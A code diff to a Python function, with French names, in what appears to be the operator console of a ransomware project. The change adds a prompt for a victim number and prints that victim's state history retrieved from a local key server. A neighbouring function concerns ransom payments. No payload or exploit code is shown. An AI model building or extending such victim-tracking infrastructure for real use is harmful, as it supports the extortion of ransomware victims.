@@ -52,15 +52,20 @@ def affichage_historique_etat_victimes():
     print("HISTORIQUE DES ETATS D'UNE VICTIME")
     print("============================================================================")
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    victim_id = input("Entrez le numéro de la victime : ")
     msg = message.set_message("HISTORY_REQ")
     network.send_message(s, msg)
+    network.send_message(s, victim_id)
     response = network.receive_message(s)
     if response is None:
         print("Aucune réponse reçue.")
         return
     # affiche les données
-    data = response
-    print(data)
+    while response is not None and message.get_message_type(response) != 'HIST_END':
+        data = list(response.values())
+        print(
+            f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {data[2]} | STATE: {data[3]}")
+        response = network.receive_message(s)
 
 
 def affichage_payement_rancon():
